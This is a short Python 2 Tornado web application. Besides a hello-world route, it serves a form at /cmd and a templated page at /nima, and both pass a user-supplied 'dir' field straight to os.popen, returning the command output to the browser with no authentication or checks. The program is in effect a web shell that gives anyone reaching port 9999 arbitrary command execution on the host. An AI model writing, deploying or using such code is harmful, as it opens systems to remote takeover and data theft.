# -*- coding:utf-8 -*-

import tornado.ioloop
import tornado.web
from tornado.options import define, options, parse_command_line

import os


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("hello,world")


class nima(tornado.web.RequestHandler):
    def get(self):
        self.render('good.html', title="nima", res="jieguo")

    def post(self):
        ii = self.get_argument('dir')
        bb = os.popen(ii).read()
        aa = str(bb)
        self.render('good.html', title='haha', res=aa)


class ff(tornado.web.RequestHandler):
    def get(self):
        self.write('<html><body><form action="/cmd" method="post">'
                   '<input type="text" name="dir">'
                   '<input type="submit" value="Submit">'
                   '</form> </body></html>')

    def post(self):
        self.set_header("Content-Type", "text/plain")
        ii = self.get_argument("dir")
        print ii
        bb = os.popen(ii).read()
        self.write("You write" +bb)

application = tornado.web.Application([
    (r'/', MainHandler),
    (r'/nima', nima),
    (r'/cmd', ff),
], template_path=os.path.join(os.path.dirname(__file__), "templates")
)


if __name__ == "__main__":
    application.listen(9999)
    tornado.ioloop.IOLoop.instance().start()